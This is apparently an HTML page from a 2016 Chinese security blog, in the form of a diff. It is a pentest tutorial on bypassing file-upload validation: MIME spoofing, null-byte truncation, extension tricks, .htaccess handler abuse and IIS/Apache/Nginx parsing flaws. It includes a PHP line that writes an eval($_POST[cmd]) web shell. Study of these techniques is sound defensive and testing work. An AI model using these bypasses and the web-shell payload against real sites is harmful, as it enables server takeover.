@@ -1,0 +1,365 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8" />
+  
+  <title>十大漏洞之文件上传 | lazy</title>
+  <meta name="author" content="lazy" />
+
+  
+  <meta name="description" content="文件上传，每个网站都存在的一个切入点，但是，同时也是经常出现纰漏的地方，以为这个纰漏，可以会给站点带来不可想象的攻击。" />
+  
+
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+  <meta property="og:title" content="十大漏洞之文件上传" />
+  <meta property="og:site_name" content="lazy" />
+
+  
+  
+  
+  
+  
+
+  
+    <meta property="og:image" content="undefined" />
+  
+
+  
+  <link href="/css/images/favicon.ico" rel="icon" />
+  
+
+  <link rel="alternate" href="/atom.xml" title="lazy" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+
+  <!-- baidu webmaster push -->
+  <script src='//push.zhanzhang.baidu.com/push.js'></script>
+
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">lazy</a></h1>
+  <h2><a href="/"></a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">主页</a></li>
+    
+      <li><a href="/achieve">所有文章</a></li>
+    
+      <li><a href="/plan">学习计划</a></li>
+    
+      <li><a href="/developer">开发者</a></li>
+    
+      <li><a href="/about">关于</a></li>
+    
+      <li><a href="http://www.cnblogs.com/lazy0">aother blog</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div></header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2016-04-27T13:26:36.000Z"><a href="/2016/04/27/十大漏洞之文件上传/">2016-04-27</a></time>
+      
+      
+  
+    <h1 class="title">十大漏洞之文件上传</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>文件上传，每个网站都存在的一个切入点，但是，同时也是经常出现纰漏的地方，以为这个纰漏，可以会给站点带来不可想象的攻击。<br><a id="more"></a></p>
+<h2 id="绕过的上传"><a href="#绕过的上传" class="headerlink" title="绕过的上传"></a>绕过的上传</h2><h3 id="1，检测javascript类型的绕过（客户端）"><a href="#1，检测javascript类型的绕过（客户端）" class="headerlink" title="1，检测javascript类型的绕过（客户端）"></a>1，检测javascript类型的绕过（客户端）</h3><pre><code>通常post请求发送到web服务器，客户端javascript验证
+上传1.php弹窗说上传格式错误，只允许.jpg，.jpeg等格式的文件
+上传一句话1.php--&gt;1.jpg 然后burp抓包1.jpg--&gt;1.php，这样就绕过了js检测
+或者F12查看源代码，找到onsubmit=”return checkFile()”，将它删除并编辑保存。
+这个时候页面就不检测了，直接上传成功，
+或者修改允许的函数checkfile(),添加我们想上传的文件格式，也是可以上传成功的。
+</code></pre><h3 id="2，检测MIME类型的绕过（服务端）"><a href="#2，检测MIME类型的绕过（服务端）" class="headerlink" title="2，检测MIME类型的绕过（服务端）"></a>2，检测MIME类型的绕过（服务端）</h3><pre><code>服务端MIME类型检测（检测Content-Type内容），burp抓包，修改Content-Type
+Content-Type:text/plain --&gt;php
+Content-Type:image/jpeg --&gt;image
+上传1.jpg---&gt;修改image/jpeg为text/plain，成功绕过。
+
+常见的MIME类型：
+超文本标记语言文本 .html text/html 　　
+xml文档 .xml text/xml
+普通文本 .txt text/plain 　　
+RTF文本 .rtf application/rtf 　　
+PDF文档 .pdf application/pdf 　　
+Microsoft Word文件 .word application/msword 　　
+PNG图像 .png image/png 　　
+GIF图形 .gif image/gif 　　
+JPEG图形 .jpeg,.jpg image/jpeg 　　
+au声音文件 .au audio/basic 　　
+MIDI音乐文件 mid,.midi audio/midi,audio/x-midi 　　
+RealAudio音乐文件 .ra, .ram audio/x-pn-realaudio 　　
+MPEG文件 .mpg,.mpeg video/mpeg 　　
+AVI文件 .avi video/x-msvideo 　　
+GZIP文件 .gz application/x-gzip 　　
+TAR文件 .tar application/x-tar 　　
+任意的二进制数据 application/octet-stream
+</code></pre><h3 id="3，检测目录路径类型的绕过-服务端"><a href="#3，检测目录路径类型的绕过-服务端" class="headerlink" title="3，检测目录路径类型的绕过(服务端)"></a>3，检测目录路径类型的绕过(服务端)</h3><pre><code>上传1.jpg,burp进行抓包，Content-Disposition:from-data;name=”path”后面一行upload是我们保存的地址。
+现在我们将upload改为upload/1.php(空格) ，接着我们来到 Proxy-&gt;intercept-&gt;Hex找到1.php(空格)这个被修改过的代码，找到同一行的数字20，改为00 ，成功绕过
+wenshell: http://www.example.com/uploading/1.php/1.jpg
+</code></pre><h3 id="4-检测文件内容的绕过（服务端）"><a href="#4-检测文件内容的绕过（服务端）" class="headerlink" title="4,检测文件内容的绕过（服务端）"></a>4,检测文件内容的绕过（服务端）</h3><pre><code>检测内容是否合法或含有恶意代码
+文件幻数检测
+    jpg--&gt;JFIF
+    gif--&gt;GIF89A
+    PNG--&gt;PNG
+文件相关信息检测
+    常用的是getimaegsize()函数检测
+    有文件头，加一些杂乱的东西，迷惑，空的地方添加木马
+文件加载检测
+    API函数检测的
+    一次渲染可以绕过，二次渲染就没戏绕过。
+</code></pre><h3 id="5，检测黑名单类型的绕过（服务端）"><a href="#5，检测黑名单类型的绕过（服务端）" class="headerlink" title="5，检测黑名单类型的绕过（服务端）"></a>5，检测黑名单类型的绕过（服务端）</h3><pre><code>将危险的后缀名写到一个文件里面，禁止指着后缀名的文件执行
+文件名绕过：
+    大小写组合绕过pHp,PhP，混搭绕过php1,php2,php3,php4,php5
+列表名绕过：
+    cer,ashx,asa,cer,cdx,htr,绕过(黑名单可能会漏掉的)
+特殊字符绕过：
+    a.asp改成a.asp_
+0x00截断绕过：
+    上传1.php.jpg burp抓包改成1.php%00.jpg，或者hex--&gt;20改成00当解析的时候，看到空格，后面的那段就不解析了
+    或者upload/1.asp(空格)/上传，hex修改20--&gt;00绕过上传
+apache解析绕过:
+    help.asp.134.x2,从前向后尝试解析，直到遇到自己认识的扩展名为止。
+双扩展名解析绕过：
+    apache的conf配置有AddHandler php5-script.php没有注释掉，
+    则，文件名1.php.jpg就能当作php执行
+.htaccess文件攻击：
+    自定义.htaccess上传，下面是内容
+    &lt;FileMatch &quot;aaa&quot;&gt;
+    SetHandler application/x-httpd-php
+    &lt;/FileMatch&gt;
+    同目录下，上传一个aaa文件，没有扩展名，内容是一句话，这个时候就成功绕过。
+</code></pre><h3 id="6-检测白名单类型的绕过（服务端）"><a href="#6-检测白名单类型的绕过（服务端）" class="headerlink" title="6,检测白名单类型的绕过（服务端）"></a>6,检测白名单类型的绕过（服务端）</h3><pre><code>解析漏洞绕过
+
+iis6.0解析绕过：
+    目录绕过：
+    IIS6.0目录路径检测解析，文件的名字为“*.asp/xxx.jpg”同样呗解析成asp
+    burp进行抓包，其中Content-Disposition:form-data;name=”path”我们把原本的 upload/ 改为 uploading/1.asp/,filename=&quot;yijuhua.asp&quot;修改为filename=&quot;yijuhua.asp/1.jpg&quot;。
+    或者创建文件夹a.php里面放一句话图片1.jpg  a.php/1.jpg---&gt;php执行
+    文件绕过：
+    首先我们请求 /aaa.php;xxx.jpg，从头部查找查找 &quot;.&quot;号,获得 .php;xxx.jpg
+    查找&quot;;&quot;,如果有则内容截断，所以/aaa.php;xxx.jpg会当做/aaa.php进行解析，除此之外我们还有下面的构造方式绕过：a.php;.jpg，a.php;jpg--&gt;php执行
+
+iis7.0/7.5解析绕过：
+    在默认Fast-CGI开启的情况下上传一个文件1.jpg    
+    内容：&lt;?php fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[cmd])?&gt;&apos;);?&gt;
+    然后访问1.jpg/.php 这样就会在同级目录下生成木马shell.php
+
+Nginx&lt;8.0.3解析绕过：
+    上传1.jpg----burp修改--&gt;1.jpg%00.php空字节绕过上传
+
+apache解析绕过：
+    a.php.x1.x2 apache从前向后尝试解析，直到遇到自己认识的扩展名为止。
+
+.htaccess文件攻击：自定义.htaccess绕过
+        &lt;FileMatch &quot;aaa&quot;&gt;
+        SetHandler application/x-httpd-php
+        &lt;/FileMatch&gt;
+    同目录下，上传一个aaa文件，没有扩展名，然后内容是“aaa”+一句话，成功绕过。
+</code></pre><h3 id="7，自动修改后缀的绕过："><a href="#7，自动修改后缀的绕过：" class="headerlink" title="7，自动修改后缀的绕过："></a>7，自动修改后缀的绕过：</h3><pre><code>上传php,服务端自动修改成了gif
+burp抓包，1.php--&gt;修改成1.pphphp成功绕过
+</code></pre><h3 id="8-渗透测试，有上传地方流程"><a href="#8-渗透测试，有上传地方流程" class="headerlink" title="8,渗透测试，有上传地方流程"></a>8,渗透测试，有上传地方流程</h3><pre><code>用户输入--&gt;轻量级检测（js,MIME检测绕过）--&gt;文件内容检测（代码注入检测绕过）--&gt;路径/扩展名检测--&gt;若检测绕过--&gt;(文件大小写绕过，名单列表绕过，特殊文件名绕过（windows），0x00截断绕过)
+1--&gt;否检测未绕过--&gt;解析攻击--&gt;（代码解析调用（htaccess文件解析，本地文件包含））--&gt;(应用层解析漏洞（Apache解析漏洞，IIS解析漏洞，Nginx解析漏洞）)
+</code></pre>
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+  
+  <div class="categories">
+    <a href="/categories/十大漏洞/">十大漏洞</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/上传绕过/">上传绕过</a>, <a href="/tags/渗透测试/">渗透测试</a>
+  </div>
+
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="widget tag">
+    <h3 class="title">关于文章</h3>
+    <div class="entry">
+    <P>文章有问题可以发邮件</p>
+    <p>大家彼此相互学习</p>
+      <p>邮箱：lazy@dropsec.xyz</p>
+    </div>
+</div>
+
+  <div class="widget tag">
+    <h3 class="title">赞助我</h3>
+    <div class="entry">
+      <img src='/css/images/qr_alipay.png' style='width:100%;background:rgba(255,255,255,0.6)' />
+    </div>
+</div>
+
+  
+<div class="widget tagcloud">
+  <h3 class="title">标签云</h3>
+  <div class="entry">
+    <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/MarkDown/" style="font-size: 10px;">MarkDown</a> <a href="/tags/hexo/" style="font-size: 20px;">hexo</a> <a href="/tags/json/" style="font-size: 10px;">json</a> <a href="/tags/python/" style="font-size: 15px;">python</a> <a href="/tags/sql注入，手工/" style="font-size: 10px;">sql注入，手工</a> <a href="/tags/sql注入，过狗，过waf/" style="font-size: 10px;">sql注入，过狗，过waf</a> <a href="/tags/上传绕过/" style="font-size: 15px;">上传绕过</a> <a href="/tags/正则表达式/" style="font-size: 10px;">正则表达式</a> <a href="/tags/渗透测试/" style="font-size: 15px;">渗透测试</a> <a href="/tags/渗透测试，命令执行/" style="font-size: 10px;">渗透测试，命令执行</a> <a href="/tags/过waf，过狗/" style="font-size: 10px;">过waf，过狗</a>
+  </div>
+</div>
+
+
+  
+  <div class="widget tag">
+    <h3 class="title">归档</h3>
+    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archive/2016/06/">    2016年06月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archive/2016/05/">    2016年05月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archive/2016/04/">    2016年04月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archive/2015/06/">    2015年06月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archive/2015/05/">    2015年05月</a><span class="archive-list-count">4</span></li></ul>
+  </div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">分类</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/python/">python</a><small>2</small></li>
+  
+    <li><a href="/categories/十大漏洞/">十大漏洞</a><small>3</small></li>
+  
+    <li><a href="/categories/杂谈/">杂谈</a><small>4</small></li>
+  
+    <li><a href="/categories/渗透测试/">渗透测试</a><small>3</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">近期文章</h3>
+  <ul class="entry">
+    
+      <li>
+        <a href="/2016/06/07/phpcms_2008远程代码执行漏洞/">phpcms-2008 远程代码执行漏洞</a>
+      </li>
+    
+      <li>
+        <a href="/2016/05/30/python_json模块/">python之json模块</a>
+      </li>
+    
+      <li>
+        <a href="/2016/05/27/python正则表达式/">python之正则表达式</a>
+      </li>
+    
+      <li>
+        <a href="/2016/04/28/十大漏洞之远程命令执行/">十大漏洞之命令执行</a>
+      </li>
+    
+      <li>
+        <a href="/2016/04/27/十大漏洞之文件上传/">十大漏洞之文件上传</a>
+      </li>
+    
+  </ul>
+</div>
+
+
+  <div class="widget tag">
+  <h3 class="title">友情链接</h3>
+  <div class="entry">
+    <ul>
+<!-- link start -->
+<li><a href='http://www.cnblogs.com/lazy0'>lazy</a></li>
+<li><a href='http://www.baidu.com'>baidu</a></li>
+<!-- link  end -->
+    </ul>
+  </div>
+</div>
+
+
+  <div class="widget tag">
+    <h3 class="title">统计</h3>
+    <div class="entry">
+      
+	<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1260064002'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s4.cnzz.com/z_stat.php%3Fid%3D1260064002' type='text/javascript'%3E%3C/script%3E"));</script>
+
+
+
+
+    </div>
+</div>
+
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<div class="alignleft">
+<span id="busuanzi_container_site_pv">
+    你好，你是第:<span id="busuanzi_value_site_pv"></span>位访客
+</span>
+</div>
+
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1260064002'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s4.cnzz.com/z_stat.php%3Fid%3D1260064002' type='text/javascript'%3E%3C/script%3E"));</script>
+
+
+
+</footer>
+  <script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+
+<script>
+    //Kill XP and IE8
+    (function(){
+        var ua = navigator.userAgent;
+        var res = /Windows NT (\d+\.\d+)/.exec(ua);
+        var xpOrLower = res && JSON.parse(res[1]) < 6;
+        res = /MSIE (\d+\.\d+)/.exec(ua);
+        var ie8OrLower = res && JSON.parse(res[1]) < 9;
+        if(xpOrLower || ie8OrLower)
+        {
+            alert('请不要用XP及之前的Windows系统，和IE8及之前的IE浏览器访问本站！');
+            location.href = "about:blank";
+        }
+        var fromBaiduSE = /^https?:\/\/www.baidu.com/.test(document.referrer);
+        if(fromBaiduSE)
+        {
+            alert('检测到你还在使用百度搜索，作为一个程序员，这是一种自暴自弃！\n\n做不作恶的程序员，从不用百度开始！')
+            location.href = "about:blank";
+        }
+    })();
+</script>
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1260064002'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s4.cnzz.com/z_stat.php%3Fid%3D1260064002' type='text/javascript'%3E%3C/script%3E"));</script> 
+//前面要添加的代码  
+//百度统计的代码  
+
+<div id='bg'></div>
+</body>
+</html>
